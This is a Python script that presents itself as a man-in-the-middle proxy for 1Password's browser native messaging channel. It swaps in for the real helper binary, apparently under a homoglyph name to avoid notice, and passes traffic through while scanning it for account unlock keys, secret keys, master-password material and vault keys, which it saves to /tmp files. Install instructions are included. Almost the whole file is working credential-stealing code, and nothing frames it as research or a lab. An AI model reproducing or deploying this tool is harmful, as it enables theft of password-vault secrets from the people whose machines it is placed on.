#!/usr/bin/env python3
"""
1Password Native Messaging MITM Proxy

This binary sits between the browser extension and the real 1Password.
It forwards all traffic transparently while logging and looking for:
- Account Unlock Key (AUK)
- Master password material
- Vault decryption keys
- Secret Key fragments

USAGE:
1. Rename real 1Password binary (e.g., 1Password-BrowserSupport-REAL)
2. Place this script at the original path (with homoglyph name)
3. Set REAL_1PASSWORD_PATH environment variable
4. Extension connects to us, we forward to real binary

CRITICAL: This must be byte-for-byte compatible with native messaging protocol.
"""

import sys
import os
import json
import struct
import subprocess
import threading
import logging
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, Any

# ============================================================
# CONFIGURATION
# ============================================================

LOG_FILE = Path("/tmp/1password_intercept.log")
CAPTURE_FILE = Path("/tmp/1password_captured_keys.json")

# Path to the REAL 1Password binary
# Set via environment variable or edit here
REAL_BINARY = os.environ.get(
    "REAL_1PASSWORD_PATH",
    "/usr/bin/1Password-BrowserSupport-REAL"
)

# Patterns that indicate sensitive key material
SENSITIVE_PATTERNS = [
    r'"auk"',           # Account Unlock Key
    r'"secretKey"',     # Secret Key
    r'"masterPassword"', # Master password
    r'"unlock"',        # Unlock operations
    r'"decrypt"',       # Decryption operations
    r'"key":\s*"[A-Za-z0-9+/=]{20,}"',  # Base64 keys
    r'"encryptedData"', # Encrypted blobs
    r'"srp"',           # SRP authentication
    r'"vault"',         # Vault operations
]

SENSITIVE_REGEX = re.compile('|'.join(SENSITIVE_PATTERNS), re.IGNORECASE)

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    filename=str(LOG_FILE),
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s'
)

logger = logging.getLogger(__name__)


def log_critical(msg: str, data: Any = None):
    """Log critical findings (potential key material)"""
    logger.critical(f"🎯 {msg}")
    if data:
        try:
            # Append to capture file
            captures = []
            if CAPTURE_FILE.exists():
                with open(CAPTURE_FILE, 'r') as f:
                    captures = json.load(f)
            
            captures.append({
                "timestamp": datetime.now().isoformat(),
                "message": msg,
                "data": data
            })
            
            with open(CAPTURE_FILE, 'w') as f:
                json.dump(captures, f, indent=2)
                
        except Exception as e:
            logger.error(f"Failed to save capture: {e}")


# ============================================================
# NATIVE MESSAGING PROTOCOL
# ============================================================

def read_message(stream) -> Optional[bytes]:
    """
    Read a native messaging message from a stream.
    Format: 4-byte length (little-endian uint32) + JSON payload
    """
    raw_length = stream.read(4)
    if not raw_length or len(raw_length) < 4:
        return None
    
    length = struct.unpack('=I', raw_length)[0]
    
    if length > 1024 * 1024:  # 1MB sanity check
        logger.warning(f"Message too large: {length} bytes")
        return None
    
    payload = stream.read(length)
    return payload


def write_message(stream, payload: bytes):
    """Write a native messaging message to a stream."""
    length = struct.pack('=I', len(payload))
    stream.write(length)
    stream.write(payload)
    stream.flush()


def analyze_message(direction: str, payload: bytes) -> Dict:
    """Analyze a message for sensitive content"""
    
    try:
        text = payload.decode('utf-8')
        data = json.loads(text)
    except:
        logger.debug(f"{direction}: Non-JSON payload ({len(payload)} bytes)")
        return {}
    
    # Check for sensitive patterns
    if SENSITIVE_REGEX.search(text):
        logger.warning(f"🔐 SENSITIVE CONTENT in {direction} message!")
        log_critical(f"Sensitive {direction} message", {
            "direction": direction,
            "size": len(payload),
            "preview": text[:500] + "..." if len(text) > 500 else text
        })
    
    # Look for specific fields
    if isinstance(data, dict):
        for key in ['auk', 'AUK', 'accountUnlockKey', 'unlockKey', 'secretKey', 'masterKey']:
            if key in data:
                log_critical(f"FOUND {key} in {direction}!", {
                    "key": key,
                    "value_preview": str(data[key])[:100]
                })
    
    return data


# ============================================================
# PROXY IMPLEMENTATION
# ============================================================

class NativeMessagingProxy:
    """
    Transparent MITM proxy for native messaging.
    
    Extension <-> Proxy <-> Real 1Password
    """
    
    def __init__(self, real_binary: str):
        self.real_binary = real_binary
        self.process: Optional[subprocess.Popen] = None
        self.running = True
        
    def start(self):
        """Start the proxy"""
        
        logger.info("=" * 60)
        logger.info("1PASSWORD PROXY STARTING")
        logger.info(f"Real binary: {self.real_binary}")
        logger.info(f"PID: {os.getpid()}")
        logger.info("=" * 60)
        
        # Verify real binary exists
        if not os.path.exists(self.real_binary):
            logger.error(f"Real binary not found: {self.real_binary}")
            self._send_error("Real binary not found")
            return
        
        # Start real 1Password process
        try:
            self.process = subprocess.Popen(
                [self.real_binary],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            logger.info(f"Started real binary (PID: {self.process.pid})")
        except Exception as e:
            logger.error(f"Failed to start real binary: {e}")
            self._send_error(str(e))
            return
        
        # Start forwarding threads
        ext_to_app = threading.Thread(target=self._forward_ext_to_app, daemon=True)
        app_to_ext = threading.Thread(target=self._forward_app_to_ext, daemon=True)
        
        ext_to_app.start()
        app_to_ext.start()
        
        # Wait for process to finish
        self.process.wait()
        self.running = False
        
        logger.info("Real binary exited, proxy shutting down")
    
    def _forward_ext_to_app(self):
        """Forward messages from extension to real app"""
        
        while self.running:
            try:
                payload = read_message(sys.stdin.buffer)
                if payload is None:
                    break
                
                logger.debug(f"EXT→APP: {len(payload)} bytes")
                analyze_message("REQUEST", payload)
                
                # Forward to real app
                write_message(self.process.stdin, payload)
                
            except Exception as e:
                logger.error(f"EXT→APP error: {e}")
                break
        
        logger.info("EXT→APP forwarding stopped")
    
    def _forward_app_to_ext(self):
        """Forward messages from real app to extension"""
        
        while self.running:
            try:
                payload = read_message(self.process.stdout)
                if payload is None:
                    break
                
                logger.debug(f"APP→EXT: {len(payload)} bytes")
                analyze_message("RESPONSE", payload)
                
                # Forward to extension
                write_message(sys.stdout.buffer, payload)
                
            except Exception as e:
                logger.error(f"APP→EXT error: {e}")
                break
        
        logger.info("APP→EXT forwarding stopped")
    
    def _send_error(self, message: str):
        """Send error message to extension"""
        error = {"error": message}
        payload = json.dumps(error).encode('utf-8')
        write_message(sys.stdout.buffer, payload)


# ============================================================
# INSTALLATION HELPERS
# ============================================================

def install_proxy():
    """Interactive installation helper"""
    
    print("1Password Native Messaging Proxy - Installation")
    print("=" * 60)
    print()
    print("This script will help you install the MITM proxy.")
    print("You need root/admin access to modify 1Password files.")
    print()
    print("Steps:")
    print("1. Locate real 1Password binary")
    print("2. Rename it (e.g., add '-REAL' suffix)")
    print("3. Place this script at original location (or homoglyph path)")
    print("4. Set REAL_1PASSWORD_PATH environment variable")
    print("5. Restart browser and trigger 1Password")
    print()
    
    # Find common locations
    common_paths = [
        "/usr/bin/1Password-BrowserSupport",
        "/usr/local/bin/1Password-BrowserSupport",
        "/Applications/1Password.app/Contents/MacOS/1Password-BrowserSupport",
        os.path.expanduser("~/.config/1Password/1Password-BrowserSupport"),
    ]
    
    print("Checking common locations:")
    for path in common_paths:
        if os.path.exists(path):
            print(f"  ✅ Found: {path}")
        else:
            print(f"  ❌ Not found: {path}")
    
    print()
    print("After installation, check these log files:")
    print(f"  - {LOG_FILE} (all messages)")
    print(f"  - {CAPTURE_FILE} (captured keys)")


def simple_test():
    """Simple test mode - just log that we were invoked"""
    
    logger.info("=" * 60)
    logger.info("PROXY TEST MODE")
    logger.info(f"Args: {sys.argv}")
    logger.info(f"Working dir: {os.getcwd()}")
    logger.info(f"User: {os.getuid()}")
    logger.info("=" * 60)
    
    # Read first message
    try:
        payload = read_message(sys.stdin.buffer)
        if payload:
            logger.info(f"Received {len(payload)} bytes")
            analyze_message("TEST", payload)
            
            # Send error response so extension knows we're fake
            response = {"success": False, "error": "Proxy test mode"}
            write_message(sys.stdout.buffer, json.dumps(response).encode())
    except Exception as e:
        logger.error(f"Test error: {e}")


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    
    if "--install" in sys.argv:
        install_proxy()
        sys.exit(0)
    
    if "--test" in sys.argv:
        simple_test()
        sys.exit(0)
    
    # Normal proxy mode
    proxy = NativeMessagingProxy(REAL_BINARY)
    proxy.start()
